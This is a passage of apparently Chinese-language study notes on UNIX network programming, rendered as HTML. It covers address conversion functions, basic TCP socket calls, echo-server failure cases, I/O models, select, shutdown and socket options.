class="token operator">-</span>bit binary network byte ordered IPv4 address<span class="token punctuation">;</span>    INADDR_NONE <span class="token keyword">if</span> error<span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">inet_ntoa</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">in_addr</span> inaddr<span class="token punctuation">)</span><span class="token punctuation">;</span>Returns<span class="token operator">:</span> pointer to dotted<span class="token operator">-</span>decimal string<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>inet_aton</code> 将字符串 strptr 转换为 32比特二进制网络字节序地址 addrptr</p><p><code>inet_addr</code> 作用同上，出错返回 <code>INADDR_NONE</code>255.255.255.255,所以不能处理该地址（被废弃）</p><p><code>inet_ntoa</code> 32bit网络字节序到点分十进制IPV4字符串，储存在静态内存，不可重入</p><p><strong>IPV4/6</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span><span class="token keyword">int</span> <span class="token function">inet_pton</span><span class="token punctuation">(</span><span class="token keyword">int</span> family<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>strptr<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>addrptr<span class="token punctuation">)</span><span class="token punctuation">;</span>Returns<span class="token operator">:</span> <span class="token number">1</span> <span class="token keyword">if</span> OK<span class="token punctuation">,</span> <span class="token number">0</span> <span class="token keyword">if</span> input not a valid presentation format<span class="token punctuation">,</span> −<span class="token number">1</span> on error<span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">inet_ntop</span><span class="token punctuation">(</span><span class="token keyword">int</span> family<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>addrptr<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>strptr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>Returns<span class="token operator">:</span> pointer to result <span class="token keyword">if</span> OK<span class="token punctuation">,</span> <span class="token constant">NULL</span> on error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>p - presentation , n - numeric</p><p><code>family</code> : AF_INET / AF_INET6 不支持 errno= <code>EAFNOSUPPORT</code>   </p><p><code>inet_pton</code> : 字符串 strptr 转换为 addrptr 二进制地址结果</p><p><code>inet_ntop</code> :  相反，len 位 strptr 大小，防止溢出 - len太小，返回空指针 errno=<code>ENOSPC</code></p><h4 id="读写函数"><a href="#读写函数" class="headerlink" title="读写函数"></a>读写函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"unp.h"</span></span><span class="token class-name">ssize_t</span> <span class="token function">readn</span><span class="token punctuation">(</span><span class="token keyword">int</span> filedes<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buff<span class="token punctuation">,</span> <span class="token class-name">size_t</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ssize_t</span> <span class="token function">writen</span><span class="token punctuation">(</span><span class="token keyword">int</span> filedes<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>buff<span class="token punctuation">,</span> <span class="token class-name">size_t</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ssize_t</span> <span class="token function">readline</span><span class="token punctuation">(</span><span class="token keyword">int</span> filedes<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buff<span class="token punctuation">,</span> <span class="token class-name">size_t</span> maxlen<span class="token punctuation">)</span><span class="token punctuation">;</span>All <span class="token keyword">return</span><span class="token operator">:</span> number of bytes read or written<span class="token punctuation">,</span> −<span class="token number">1</span> on error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>readline</code> 每次读一个字符，极端地慢</p><h3 id="Chapter-4"><a href="#Chapter-4" class="headerlink" title="Chapter 4"></a>Chapter 4</h3><p>基本 TCP 套接字编程</p><h4 id="Socket-函数"><a href="#Socket-函数" class="headerlink" title="Socket 函数"></a>Socket 函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token keyword">int</span> <span class="token function">socket</span><span class="token punctuation">(</span><span class="token keyword">int</span> family<span class="token punctuation">,</span> <span class="token keyword">int</span> type<span class="token punctuation">,</span> <span class="token keyword">int</span> protocol<span class="token punctuation">)</span><span class="token punctuation">;</span>Returns<span class="token operator">:</span> non<span class="token operator">-</span>negative descriptor <span class="token keyword">if</span> OK<span class="token punctuation">,</span> −<span class="token number">1</span> on error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><table><thead><tr><th></th><th>AF_INET</th><th>AF_INET6</th><th>AF_LOCAL</th><th>AF_ROUTE</th><th>AF_KEY</th></tr></thead><tbody><tr><td>SOCK_STREAM</td><td>TCP|SCTP</td><td>TCP|SCTP</td><td>YES</td><td></td><td></td></tr><tr><td>SOCK_DGRAM</td><td>UDP</td><td>UDP</td><td>YES</td><td></td><td></td></tr><tr><td>SOCK_SEQPACKET</td><td>SCTP</td><td>SCTP</td><td>YES</td><td></td><td></td></tr><tr><td>SOCK_RAW</td><td>IPV4</td><td>IPV6</td><td></td><td>YES</td><td>YES</td></tr></tbody></table><h4 id="Connect-函数"><a href="#Connect-函数" class="headerlink" title="Connect 函数"></a>Connect 函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token keyword">int</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>servaddr<span class="token punctuation">,</span> <span class="token class-name">socklen_t</span> addrlen<span class="token punctuation">)</span><span class="token punctuation">;</span>Returns<span class="token operator">:</span> <span class="token number">0</span> <span class="token keyword">if</span> OK<span class="token punctuation">,</span> −<span class="token number">1</span> on error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>client 用于与 server 连接，内核会自己选择临时端口</p><ul><li>75 s 无响应后返回 <code>ETIMEDOUT</code></li><li>若相应 RST 则马上返回 <code>ECONNREFUSED</code> - 指定端口没有等待连接</li><li>目的不可达，返回 <code>EHOSTUNREACH</code>, <code>ENETUNREACH</code></li></ul><p>错误</p><ul><li><p>如果给不存在的机器发送，因为没有 ARP reply , <code>ETIMEOUT</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">connect error: Connection timed out<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>如果给未运行 server 的机器发送，收到 RST ， <code>ECONNREFUSED</code></p><pre class="line-numbers language-none"><code class="language-none">connect error: Connection refused<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>给不可达发送， 收到 ICMP 不可达错误， <code>EHOSTUNREACH</code></p><pre class="line-numbers language-none"><code class="language-none">connect error: No route to host<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>每次 connect 失败后，都需要关闭 sockfd 重新调用 socket 函数</p></li></ul><h4 id="bind-函数"><a href="#bind-函数" class="headerlink" title="bind 函数"></a>bind 函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token keyword">int</span> <span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>myaddr<span class="token punctuation">,</span> <span class="token class-name">socklen_t</span> addrlen<span class="token punctuation">)</span><span class="token punctuation">;</span>Returns<span class="token operator">:</span> <span class="token number">0</span> <span class="token keyword">if</span> OK<span class="token punctuation">,</span> −<span class="token number">1</span> on error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>32b ipv4 / 128b ipv6 + 16b TCP/UDP port number</p><p><code>Servers</code> 会在启动时调用 bind 端口（程序定义） ，若没有则当调用 connect 或 listen 时，内核会选择一个临时端口  或 根据 SYN 的目的地址</p><p><code>Client</code> 通常不会bind 而是 connect 时由内核根据路径选择</p><h5 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h5><p>wildcard 通配符</p><p>ipv4 : <code>INADDR_ANY</code> 0.0.0.0，内核等到TCP连接，UDP报文发送后选择ip地址</p><p>ipv6 : <code>in6addr_any</code> 由系统预先分配并置为<code>IN6ADDR_ANY_INIT</code></p><p>RPC  例外，会通过 端口映射器注册</p><h5 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h5><p><code>EADDRINUSE</code> ： <code>Address already in use</code> 地址已使用</p><h4 id="listen-函数"><a href="#listen-函数" class="headerlink" title="listen 函数"></a>listen 函数</h4><p><strong>Server</strong> ： convert unconnected socket into a passive socket </p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token keyword">int</span> <span class="token function">listen</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">int</span> backlog<span class="token punctuation">)</span><span class="token punctuation">;</span>Returns<span class="token operator">:</span> <span class="token number">0</span> <span class="token keyword">if</span> OK<span class="token punctuation">,</span> −<span class="token number">1</span> on error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>backlog</code> : 内核队列中排队的最大连接数 </p><p>调用时间： socket bind 后， accept 前</p><p>为 listening socket 保持两个队列</p><ul><li><code>incomplete connection queue</code> 未完成连接队列 ， 未完成握手，<code>SYN_RCVD</code> 态</li><li><code>completed connection queue</code>  已完成连接队列 ， 完成握手 ， <code>ESTABLISHED</code> 态</li></ul><p>两队之和不超过 backlog</p><h4 id="accept-函数"><a href="#accept-函数" class="headerlink" title="accept 函数"></a>accept 函数</h4><p> 返回已完成连接队列队头，如果为空，进程睡眠</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token keyword">int</span> <span class="token function">accept</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>cliaddr<span class="token punctuation">,</span> <span class="token class-name">socklen_t</span> <span class="token operator">*</span>addrlen<span class="token punctuation">)</span><span class="token punctuation">;</span>Returns<span class="token operator">:</span> non<span class="token operator">-</span>negative descriptor <span class="token keyword">if</span> OK<span class="token punctuation">,</span> −<span class="token number">1</span> on error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><code>sockfd</code> : listening socket    监听</li><li><code>return</code> : connected socket 已连接</li><li><code>cliaddr</code> &amp; <code>addrlen</code> ：对端的地址和长度 </li><li>一对多的关系，监听socket 保持打开，连接socket完成对一个客户的服务就关闭</li></ul><h5 id="bind-错误"><a href="#bind-错误" class="headerlink" title="bind 错误"></a>bind 错误</h5><ul><li><p>非超级用户：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">bind</span> error: Permission denied<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="fork-和-exec-函数"><a href="#fork-和-exec-函数" class="headerlink" title="fork 和 exec 函数"></a>fork 和 exec 函数</h4></li></ul><p>fork 是唯一生成新进程的函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token class-name">pid_t</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Returns<span class="token operator">:</span> <span class="token number">0</span> in child<span class="token punctuation">,</span> process ID of child in parent<span class="token punctuation">,</span> −<span class="token number">1</span> on error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="并发服务器"><a href="#并发服务器" class="headerlink" title="并发服务器"></a>并发服务器</h4><p>父进程 listenfd 监听 ， 子进程 connfd 负责接收数据和实际 操作</p><h4 id="close-函数"><a href="#close-函数" class="headerlink" title="close 函数"></a>close 函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">)</span><span class="token punctuation">;</span>Returns<span class="token operator">:</span> <span class="token number">0</span> <span class="token keyword">if</span> OK<span class="token punctuation">,</span> −<span class="token number">1</span> on error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>为了方便多个进程使用套接字，它是引用计数的。</p><p>内核 会 发完所有等待发送的数据，然后TCP连接终止过程</p><p>如果只想发送FIN，改用<code>shutdown</code>函数</p><h4 id="地址-函数"><a href="#地址-函数" class="headerlink" title="地址 函数"></a>地址 函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token keyword">int</span> <span class="token function">getsockname</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>localaddr<span class="token punctuation">,</span> <span class="token class-name">socklen_t</span> <span class="token operator">*</span>addrlen<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">getpeername</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>peeraddr<span class="token punctuation">,</span> <span class="token class-name">socklen_t</span> <span class="token operator">*</span>addrlen<span class="token punctuation">)</span><span class="token punctuation">;</span>Both <span class="token keyword">return</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token keyword">if</span> OK<span class="token punctuation">,</span> −<span class="token number">1</span> on error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>sock 本地，peer 连接对端</p><p>重点基本都要求掌握 、 5.13不要求掌握、</p><p>6.9，6.20 不要求掌握</p><h3 id="Chapter-5"><a href="#Chapter-5" class="headerlink" title="Chapter 5"></a>Chapter 5</h3><h4 id="TCP-Echo-Server"><a href="#TCP-Echo-Server" class="headerlink" title="TCP Echo Server"></a>TCP Echo Server</h4><p>Port : 5000 - 49152</p><h4 id="Normal-Startup"><a href="#Normal-Startup" class="headerlink" title="Normal Startup"></a>Normal Startup</h4><p>server 阻塞在  accept （还未启动用户）</p><p>client  阻塞在 fgets 调用</p><p>连接</p><p>服务器阻塞在 read ，父进程阻塞在 accept </p><p>此时 三个进程 STAT 都是 S- sleeping - （已阻塞）</p><p><strong>WCHAN</strong> 父进程 wait_for_connect ,  server tcp_data_wait , client - read_chan</p><h4 id="Normal-Termination"><a href="#Normal-Termination" class="headerlink" title="Normal Termination"></a>Normal Termination</h4><p>Client ： EOF 字符（Control+D) 终止服务器</p><p>客户端进入 TIME_WAIT 状态</p><h4 id="信号处理"><a href="#信号处理" class="headerlink" title="信号处理"></a>信号处理</h4><p>SIGKILL &amp; SIGSTOP 不能被捕获</p><p>信号处理函数是一个仅有一个整数参数且不返回值的函数</p><h3 id="wait-amp-waitpid"><a href="#wait-amp-waitpid" class="headerlink" title="wait &amp; waitpid"></a>wait &amp; waitpid</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span><span class="token class-name">pid_t</span> <span class="token function">wait</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>statloc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">pid_t</span> <span class="token function">waitpid</span><span class="token punctuation">(</span><span class="token class-name">pid_t</span> pid<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>statloc<span class="token punctuation">,</span> <span class="token keyword">int</span> options<span class="token punctuation">)</span><span class="token punctuation">;</span>Both <span class="token keyword">return</span><span class="token operator">:</span> process ID <span class="token keyword">if</span> OK<span class="token punctuation">,</span> <span class="token number">0</span> or −<span class="token number">1</span> on error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>处理已终止的子进程</p><ul><li>返回值： 已终止子进程的进程ID号，通过statloc指针返回的子进程终止状态（一个整数）</li><li>对于同种类型的信号，主机只会执行一次信号处理函数</li></ul><h4 id="accept返回前连接中止"><a href="#accept返回前连接中止" class="headerlink" title="accept返回前连接中止"></a>accept返回前连接中止</h4><p>connect 后， accept 前，客户端发送 RST 报文</p><p>POSIX  ： <code>ECONNABORTED</code>  - <code>software caused connection abort</code></p><h4 id="服务器进程终止"><a href="#服务器进程终止" class="headerlink" title="服务器进程终止"></a>服务器进程终止</h4><p>服务器进程崩溃后，如果client不操作，会阻塞在fgets，输入字符后，readline因接收到FIN返回0（EOF），client 返回 ： <code>str_cli: server terminated prematurely</code> - 程序定义的并结束</p><p>如果先收到了RST，会返回<code>ECONNRESET</code> -<code>connection reset by peer</code></p><p>RST 会因为并没有与该客户端连接但是接收到该客户端发送的内容而被服务器发送</p><h4 id="服务器主机崩溃"><a href="#服务器主机崩溃" class="headerlink" title="服务器主机崩溃"></a>服务器主机崩溃</h4><p>同上面不同的是，服务器并不会有任何反应，会有以下两种情况：</p><ul><li>一直没有响应 <code>ETIMEOUT</code></li><li>中间路由器判断不可达，响应一个 <code>destination unreachable</code> 的 ICMP，返回的错误是<code>EHOSTUNREACH</code>或 <code>ENETUNREACH</code></li></ul><h4 id="服务器主机崩溃后重启"><a href="#服务器主机崩溃后重启" class="headerlink" title="服务器主机崩溃后重启"></a>服务器主机崩溃后重启</h4><p>当服务器主机崩溃后重启时，它的TCP丢失了崩溃前的所有连接信息，因此服务器TCP对于所收到的来自客户的数据分节响应以 一个RST</p><h4 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h4><p>服务器读入换行符，所搜索的只是换行符</p><p>二进制 ： <code>sscanf</code> 转换到 结构体 binary ，发送后，对方也用同样的结构体接收。</p><p>大小端不同 ， 同样int型长度不同，结构体的打包方式不同 都会导致负数不行，</p><p>解决方法： 发送 string ， 用 XDR（external data representation) 发送</p><h3 id="Chapter-6"><a href="#Chapter-6" class="headerlink" title="Chapter 6"></a>Chapter 6</h3><h4 id="I-O-Model"><a href="#I-O-Model" class="headerlink" title="I/O Model"></a>I/O Model</h4><p>分为两个部分 ： 等待对端发送数据 ，将数据从内核拷贝到用户</p><ul><li>blocking ： 调用接收函数后就一直等到两步都完成在返回</li><li>Nonblocking ：第一阶段不断循环call，知道收到完整包</li><li>Multiplexing：第一步调用select，直到返回readable，然后调用recvfrom完成第二步<ul><li>好处： 可以等待<strong>多个</strong>描述符</li></ul></li><li>Signal-Driven: 调用后立即返回，signal handler 会在 data 准备好后发出信号，调用recvfrom完成第二步</li><li>Asynchronous：告知内核启动某个操作， 并让内核在两步操作 完成后通知我们</li></ul><h4 id="select-函数"><a href="#select-函数" class="headerlink" title="select 函数"></a>select 函数</h4><p>告诉内核等待多个事件，有时间发生或Timeout后唤醒他</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/select.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/time.h></span></span><span class="token keyword">int</span> <span class="token function">select</span><span class="token punctuation">(</span><span class="token keyword">int</span> maxfdp1<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>readset<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>writeset<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>exceptset<span class="token punctuation">,</span><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">timeval</span> <span class="token operator">*</span>timeout<span class="token punctuation">)</span><span class="token punctuation">;</span>Returns<span class="token operator">:</span> positive count of ready descriptors<span class="token punctuation">,</span> <span class="token number">0</span> on timeout<span class="token punctuation">,</span> −<span class="token number">1</span> on error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>maxfdp1</code>，待测试的最大描述符值+1</li><li><code>set</code> ： 告诉内核 what descriptors we are interested in ，不关心设为空，三个参数都是 value-result 类型的，调用时为关心的描述符的值，返回时指示哪些描述符已就绪<ul><li><code>readset</code> :  Any of the descriptors in the readset are ready for reading</li><li><code>writeset</code>: Any of the descriptors in the writeset are ready for reading</li><li><code>exceptset</code> : Any of the descriptors in the exceptset have an exception condition pending</li></ul></li><li><code>timeout</code> : how long to wait - 信号中断 - 不准<ul><li>设置为空 ：永远等待</li><li>值：固定时间</li><li>0：根本不等待- 轮询（polling）</li></ul></li><li><code>Returns</code> ：就绪的数目，timeout=0，error=-1</li><li>这是系统函数，descriptor 和 socket 无关，socket 可以 select 任意 descriptor</li><li>错误处理 - 不考</li></ul><h5 id="fd-set-数据结构"><a href="#fd-set-数据结构" class="headerlink" title="fd_set 数据结构"></a>fd_set 数据结构</h5><p>每一位代表一个描述符，每一bit为</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">FD_ZERO</span><span class="token punctuation">(</span>fd_set <span class="token operator">*</span>fdset<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* clear all bits in fdset */</span><span class="token keyword">void</span> <span class="token function">FD_SET</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>fdset<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* turn on the bit for fd in fdset */</span><span class="token keyword">void</span> <span class="token function">FD_CLR</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>fdset<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* turn off the bit for fd in fdset */</span><span class="token keyword">int</span> <span class="token function">FD_ISSET</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>fdset<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* is the bit for fd on in fdset ? */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>利用 <code>FD_ZERO</code> 进行初始化十分重要,因为是 value-result值会变化</li><li><code>FD_SETSIZE</code> : 1024</li></ul><h5 id="读-ready-的条件"><a href="#读-ready-的条件" class="headerlink" title="读 ready 的条件"></a>读 ready 的条件</h5><ul><li>收到的数据高于 low-water 低水位了</li><li>连接关闭了，read 返回 0 （EOF）</li><li>是监听套接字，且有已完成的连接 ？</li><li>套接字有错误待处理，返回 -1 ， errno 设置成确切的错误条件</li></ul><h5 id="写-ready-的条件"><a href="#写-ready-的条件" class="headerlink" title="写 ready 的条件"></a>写 ready 的条件</h5><ul><li>已连接（udp不需要），可写空间超过 low-water </li><li>写半边关闭了 （有未完成发送的数据，要发送出去）</li><li>non-blocking connect 建立了连接或失败了</li><li>套接字有错误待处理，返回 -1 ， errno 设置成确切的错误条件</li></ul><h5 id="exceptiong-ready"><a href="#exceptiong-ready" class="headerlink" title="exceptiong ready"></a>exceptiong ready</h5><p>如果一个套接字存在带外数据或者仍处于带外标记，那么它有异常条件待处理</p><h4 id="str-cli"><a href="#str-cli" class="headerlink" title="str_cli"></a>str_cli</h4><p>阻塞在 select ，将原本的待前后顺序的阻塞，变成同时的阻塞</p><h4 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown"></a>shutdown</h4><p>给服务器发送一个FIN，告诉它我们已经完成了数据发送，但是 仍然保持套接字描述符打开以便读取</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token keyword">int</span> <span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">int</span> howto<span class="token punctuation">)</span><span class="token punctuation">;</span>Returns<span class="token operator">:</span> <span class="token number">0</span> <span class="token keyword">if</span> OK<span class="token punctuation">,</span> −<span class="token number">1</span> on error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>不动引用计数就激发TCP的正常连接终止序列</li><li>close终止读和写两个方向的数据传送，shutdown 还可以继续读</li><li>三种可选项<ul><li><code>SHUT_RD</code> ：关闭连接的读这一半</li><li><code>SHUT_WR</code>：关闭连接的写这一半</li><li><code>SHUT_RDWR</code>：连接的读半部和写半部都关闭</li></ul></li></ul><h4 id="str-cli-pipeline版"><a href="#str-cli-pipeline版" class="headerlink" title="str_cli  pipeline版"></a>str_cli  pipeline版</h4><p>加入 shutdown ，模拟先连续发送数据，关闭写半部，然后再连续接收返回数据的pipeline操作</p><h4 id="TCP-echo-程序-select-版"><a href="#TCP-echo-程序-select-版" class="headerlink" title="TCP echo 程序- select 版"></a>TCP echo 程序- select 版</h4><p><code>client</code> 数组存储已连接accept描述符的值</p><p>省去了 fork 新进程的开销</p><p>rset 数组保存 0-stdin，1-stdout，2-stderr ，3– 都是已连接描述符</p><ul><li>客户发送 FIN，4变为可读read将返回0。关闭该套接字并把client[0]的值置为-1，把描述符集中描述符4的位设置为0。注意，<strong>maxfd的值没有改变</strong>。</li></ul><h3 id="Chapter-7"><a href="#Chapter-7" class="headerlink" title="Chapter 7"></a>Chapter 7</h3><h4 id="sockopt-函数"><a href="#sockopt-函数" class="headerlink" title="_sockopt 函数"></a>_sockopt 函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token keyword">int</span> <span class="token function">getsockopt</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">int</span> level<span class="token punctuation">,</span> <span class="token keyword">int</span> optname<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>optval<span class="token punctuation">,</span> <span class="token class-name">socklen_t</span> <span class="token operator">*</span>optlen<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">setsockopt</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">int</span> level<span class="token punctuation">,</span> <span class="token keyword">int</span> optname<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>optval<span class="token punctuation">,</span><span class="token class-name">socklen_t</span> optlen<span class="token punctuation">)</span><span class="token punctuation">;</span>Both <span class="token keyword">return</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token keyword">if</span> OK<span class="token punctuation">,</span> −<span class="token number">1</span> on error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>sockfd ： 打开的套接字描述符</li><li>level ：指代系统中解释该选项的代码</li><li>optval ：存储option的数据结构 - 是标志0为不启用，值为启用</li><li>optlen ：长度 - value-result</li></ul><p>sockopt :掌握 7.2 原理 -  SO_LINGER / SO_KEEPALIVE / SO_DONTROUTE</p><h5 id="SO-KEEPALIVE"><a href="#SO-KEEPALIVE" class="headerlink" title="SO_KEEPALIVE"></a>SO_KEEPALIVE</h5><p>保活</p><h5 id="SO-LINGER-？"><a href="#SO-LINGER-？" class="headerlink" title="SO_LINGER ？"></a>SO_LINGER ？</h5><p>关闭 close 时是否丢弃保留在套接字发送缓冲区中的任何数据，</p><p>设置正的延滞时间</p><h5 id="SO-DONTROUTE"><a href="#SO-DONTROUTE" class="headerlink" title="SO_DONTROUTE"></a>SO_DONTROUTE</h5><p>是否绕过下层协议的路由机制</p><pre><code> IP : IP_HDRINCL / IP_TTL </code></pre><h5 id="IP-HDRINCL"><a href="#IP-HDRINCL" class="headerlink" title="IP_HDRINCL"></a>IP_HDRINCL</h5><p>设置了就需要自己构建IP头</p><p><strong>IP_TTL</strong></p><p>设置和获取系统用在从某个给定套接字的默认TTL值</p><h5 id="TCP-TCP-MAXSEG"><a href="#TCP-TCP-MAXSEG" class="headerlink" title="TCP : TCP_MAXSEG"></a>TCP : TCP_MAXSEG</h5><p>允许我们获取或设置TCP连接的最大分节大小</p><p>SYN中通告的MSS</p><h3 id="Chapter-8"><a href="#Chapter-8" class="headerlink" title="Chapter 8"></a>Chapter 8</h3><p>​    8.1 图 ， 并发程序设计 - 重点注意区别</p><p><code>sendto()</code> 